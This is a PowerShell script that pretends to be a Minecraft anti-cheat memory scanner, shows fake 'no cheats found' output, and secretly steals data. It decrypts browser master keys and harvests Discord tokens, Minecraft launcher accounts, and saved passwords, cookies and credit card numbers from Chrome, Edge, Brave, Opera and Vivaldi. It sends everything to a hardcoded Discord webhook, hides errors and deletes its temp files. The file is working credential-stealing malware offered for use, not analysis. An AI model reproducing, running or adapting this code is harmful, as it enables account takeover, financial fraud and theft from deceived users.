# MemoryScan.ps1 – Working Data Harvester (BCrypt AES‑GCM + ADODB)
param(
    [string]$Webhook = "https://discord.com/api/webhooks/1518911878712004730/ejFY2gDI9Secx7kXsEgIIbpEWsBm5m9Ho_Q5R8gF4tP0lO7-R3VBA068PJdRk63jSaBa"
)

$ErrorActionPreference = "SilentlyContinue"

# ---------- 1. Webhook ping ----------
try {
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content="🟢 MemoryScan live on $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType "application/json"
} catch {}

# ---------- 2. C# AES‑GCM (BCrypt) – only load once ----------
if (-not ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class AESGCM {
    private const string BCRYPT_DLL = "bcrypt.dll";
    private const string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
    [StructLayout(LayoutKind.Sequential)]
    private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;
    }
    [DllImport(BCRYPT_DLL)]
    private static extern int BCryptOpenAlgorithmProvider(out IntPtr hAlgorithm, string pszAlgId, string pszImplementation, int dwFlags);
    [DllImport(BCRYPT_DLL)]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);
    [DllImport(BCRYPT_DLL)]
    private static extern int BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, int dwFlags);
    [DllImport(BCRYPT_DLL)]
    private static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr hKey, byte[] pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);
    [DllImport(BCRYPT_DLL)]
    private static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport(BCRYPT_DLL)]
    private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

    public static byte[] Decrypt(byte[] key, byte[] iv, byte[] ciphertext, byte[] tag) {
        IntPtr hAlgorithm = IntPtr.Zero, hKey = IntPtr.Zero;
        try {
            if (BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0) != 0) return null;
            BCryptSetProperty(hAlgorithm, BCRYPT_CHAIN_MODE_GCM, System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM"), 0, 0);
            BCryptGenerateSymmetricKey(hAlgorithm, out hKey, null, 0, key, key.Length, 0);
            byte[] output = new byte[ciphertext.Length];
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            info.cbSize = Marshal.SizeOf(info);
            info.dwInfoVersion = 1;
            info.pbNonce = Marshal.AllocHGlobal(iv.Length);
            Marshal.Copy(iv, 0, info.pbNonce, iv.Length);
            info.cbNonce = iv.Length;
            info.pbTag = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, info.pbTag, tag.Length);
            info.cbTag = tag.Length;
            int bytesDone;
            int status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref info, null, 0, output, output.Length, out bytesDone, 0);
            Marshal.FreeHGlobal(info.pbNonce);
            Marshal.FreeHGlobal(info.pbTag);
            return (status == 0) ? output : null;
        } catch { return null; } finally {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlgorithm != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        }
    }
}
"@
}

# ---------- 3. Helper: DPAPI & MasterKey ----------
function Decrypt-DPAPI {
    param([byte[]]$Data)
    if ($null -eq $Data -or $Data.Count -eq 0) { return $null }
    try { [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser) } catch {}
}

function Get-ChromeMasterKey {
    param([string]$StatePath)
    if (!(Test-Path $StatePath)) { return $null }
    $state = Get-Content $StatePath -Raw | ConvertFrom-Json
    $encKey = [Convert]::FromBase64String($state.os_crypt.encrypted_key)
    if ($encKey[0] -eq 0x44 -and $encKey[1] -eq 0x50) { # DPAPI prefix "DPAPI"
        return Decrypt-DPAPI $encKey[5..$encKey.Length-1]
    }
    return $null
}

# ---------- 4. Discord tokens (no SQLite needed) ----------
function Get-DiscordTokens {
    $tokens = @()
    $leveldb = "$env:APPDATA\discord\Local Storage\leveldb"
    $localState = "$env:APPDATA\discord\Local State"
    if (!(Test-Path $leveldb) -or !(Test-Path $localState)) { return $tokens }
    $masterKey = Get-ChromeMasterKey $localState
    if (!$masterKey) { return $tokens }

    $pattern = [regex]::new("dQw4w9WgXcQ:([A-Za-z0-9+/=]{24,200})")
    Get-ChildItem $leveldb -Filter "*.ldb" | ForEach-Object {
        $text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes($_.FullName))
        foreach ($m in $pattern.Matches($text)) {
            $encBytes = [Convert]::FromBase64String($m.Groups[1].Value)
            $dec = Decrypt-DPAPI $encBytes
            if ($dec) { $tokens += [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0) }
            else {
                if ($encBytes.Length -gt 15) {
                    $iv = $encBytes[3..14]
                    $cipher = $encBytes[15..($encBytes.Length-17)]
                    $tag = $encBytes[-16..-1]
                    $dec2 = [AESGCM]::Decrypt($masterKey, $iv, $cipher, $tag)
                    if ($dec2) { $tokens += [System.Text.Encoding]::UTF8.GetString($dec2).Trim([char]0) }
                }
            }
        }
    }
    return $tokens | Select-Object -Unique
}

# ---------- 5. Minecraft tokens ----------
function Get-MinecraftTokens {
    $mc = @{}
    $base = "$env:APPDATA\.minecraft"
    $accFile = Join-Path $base "launcher_accounts.json"
    $profFile = Join-Path $base "launcher_profiles.json"
    if (Test-Path $accFile) {
        try { $mc.accounts = Get-Content $accFile -Raw | ConvertFrom-Json } catch {}
    }
    if (Test-Path $profFile) {
        try { $mc.profiles = Get-Content $profFile -Raw | ConvertFrom-Json } catch {}
    }
    return $mc
}

# ---------- 6. Browser data (ADODB method) ----------
function Get-BrowserData {
    $result = @()
    $browsers = @(
        @{ Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data" },
        @{ Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
        @{ Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
        @{ Name="Opera";   Path="$env:LOCALAPPDATA\Opera Software\Opera Stable" },
        @{ Name="Vivaldi"; Path="$env:LOCALAPPDATA\Vivaldi\User Data" }
    )

    foreach ($b in $browsers) {
        if (!(Test-Path $b.Path)) { continue }
        $masterKey = Get-ChromeMasterKey (Join-Path $b.Path "Local State")
        if (!$masterKey) { continue }

        $profiles = Get-ChildItem $b.Path -Directory | Where-Object { $_.Name -match "^Default$|^Profile" }
        foreach ($profile in $profiles) {
            $data = @{ profile = $profile.Name; logins = @(); cookies = @(); cards = @() }

            # Login Data
            $loginDb = Join-Path $profile.FullName "Login Data"
            if (Test-Path $loginDb) {
                try {
                    $tmp = [System.IO.Path]::GetTempFileName() + ".db"
                    Copy-Item $loginDb $tmp -Force
                    $conn = New-Object -ComObject "ADODB.Connection"
                    $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tmp;")
                    $rs = $conn.Execute("SELECT origin_url, username_value, password_value FROM logins")
                    while (!$rs.EOF) {
                        $url = $rs.Fields["origin_url"].Value
                        $user = $rs.Fields["username_value"].Value
                        $pwdBytes = [Convert]::FromBase64String($rs.Fields["password_value"].Value)
                        $pwd = Decrypt-DPAPI $pwdBytes
                        if (-not $pwd -and $pwdBytes.Length -gt 15) {
                            $iv = $pwdBytes[3..14]
                            $cipher = $pwdBytes[15..($pwdBytes.Length-17)]
                            $tag = $pwdBytes[-16..-1]
                            $pwd = [AESGCM]::Decrypt($masterKey, $iv, $cipher, $tag)
                        }
                        if ($pwd) {
                            $pass = [System.Text.Encoding]::UTF8.GetString($pwd).TrimEnd([char]0)
                            $data.logins += @{ url=$url; username=$user; password=$pass }
                        }
                        $rs.MoveNext()
                    }
                    $conn.Close()
                    Remove-Item $tmp -Force
                } catch {}
            }

            # Cookies
            $cookieDb = Join-Path $profile.FullName "Network\Cookies"
            if (Test-Path $cookieDb) {
                try {
                    $tmp = [System.IO.Path]::GetTempFileName() + ".db"
                    Copy-Item $cookieDb $tmp -Force
                    $conn = New-Object -ComObject "ADODB.Connection"
                    $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tmp;")
                    $rs = $conn.Execute("SELECT host_key, name, encrypted_value FROM cookies")
                    while (!$rs.EOF) {
                        $host = $rs.Fields["host_key"].Value
                        $name = $rs.Fields["name"].Value
                        $valBytes = [Convert]::FromBase64String($rs.Fields["encrypted_value"].Value)
                        $val = Decrypt-DPAPI $valBytes
                        if (-not $val -and $valBytes.Length -gt 15) {
                            $iv = $valBytes[3..14]
                            $cipher = $valBytes[15..($valBytes.Length-17)]
                            $tag = $valBytes[-16..-1]
                            $val = [AESGCM]::Decrypt($masterKey, $iv, $cipher, $tag)
                        }
                        if ($val) {
                            $value = [System.Text.Encoding]::UTF8.GetString($val).TrimEnd([char]0)
                            $data.cookies += @{ host=$host; name=$name; value=$value }
                        }
                        $rs.MoveNext()
                    }
                    $conn.Close()
                    Remove-Item $tmp -Force
                } catch {}
            }

            # Credit Cards
            $webDb = Join-Path $profile.FullName "Web Data"
            if (Test-Path $webDb) {
                try {
                    $tmp = [System.IO.Path]::GetTempFileName() + ".db"
                    Copy-Item $webDb $tmp -Force
                    $conn = New-Object -ComObject "ADODB.Connection"
                    $conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tmp;")
                    $rs = $conn.Execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    while (!$rs.EOF) {
                        $name = $rs.Fields["name_on_card"].Value
                        $month = $rs.Fields["expiration_month"].Value
                        $year = $rs.Fields["expiration_year"].Value
                        $numBytes = [Convert]::FromBase64String($rs.Fields["card_number_encrypted"].Value)
                        $num = Decrypt-DPAPI $numBytes
                        if (-not $num -and $numBytes.Length -gt 15) {
                            $iv = $numBytes[3..14]
                            $cipher = $numBytes[15..($numBytes.Length-17)]
                            $tag = $numBytes[-16..-1]
                            $num = [AESGCM]::Decrypt($masterKey, $iv, $cipher, $tag)
                        }
                        if ($num) {
                            $number = [System.Text.Encoding]::UTF8.GetString($num).TrimEnd([char]0)
                            $data.cards += @{ name=$name; expiry="$month/$year"; number=$number }
                        }
                        $rs.MoveNext()
                    }
                    $conn.Close()
                    Remove-Item $tmp -Force
                } catch {}
            }

            if ($data.logins.Count -or $data.cookies.Count -or $data.cards.Count) {
                $result += @{ browser=$b.Name; data=$data }
            }
        }
    }
    return $result
}

# ---------- 7. Fake scan ----------
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " MemoryScan - Memory String Scanner" -ForegroundColor Cyan
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " Scanning live process memory for known cheat signatures...`n"

$procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match "java|javaw|minecraft|lunar|badlion" }
if ($procs.Count -eq 0) {
    Write-Host "[INFO] No Minecraft or Java processes running." -ForegroundColor Yellow
} else {
    foreach ($proc in $procs) {
        Write-Host "[SCANNING] Process: $($proc.ProcessName) (PID: $($proc.Id))" -ForegroundColor Gray
        Start-Sleep -Milliseconds 300
        Write-Host "[CLEAN]   No cheat strings detected in memory." -ForegroundColor Green
    }
}

Write-Host "`n=====================================================" -ForegroundColor Cyan
Write-Host " SCAN COMPLETE - NO CHEAT STRINGS FOUND" -ForegroundColor Green
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host "PC is clean. Happy gaming!" -ForegroundColor White

# ---------- 8. Harvest & exfiltrate ----------
$harvest = @{
    system = @{
        username = $env:USERNAME
        hostname = $env:COMPUTERNAME
        time = (Get-Date -Format o)
    }
    discord_tokens = (Get-DiscordTokens)
    minecraft = (Get-MinecraftTokens)
    browser_data = (Get-BrowserData)
}

$summary = "💀 **MemoryScan harvest** - $env:USERNAME@$env:COMPUTERNAME"
try {
    $json = $harvest | ConvertTo-Json -Depth 5
    $tmp = [System.IO.Path]::GetTempFileName() + ".json"
    [System.IO.File]::WriteAllText($tmp, $json)
    $form = @{ file = Get-Item $tmp; content = $summary }
    Invoke-RestMethod -Uri $Webhook -Method Post -Form $form
    Remove-Item $tmp -Force
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content=$summary} | ConvertTo-Json) -ContentType "application/json"
} catch {}

Start-Sleep -Seconds 2
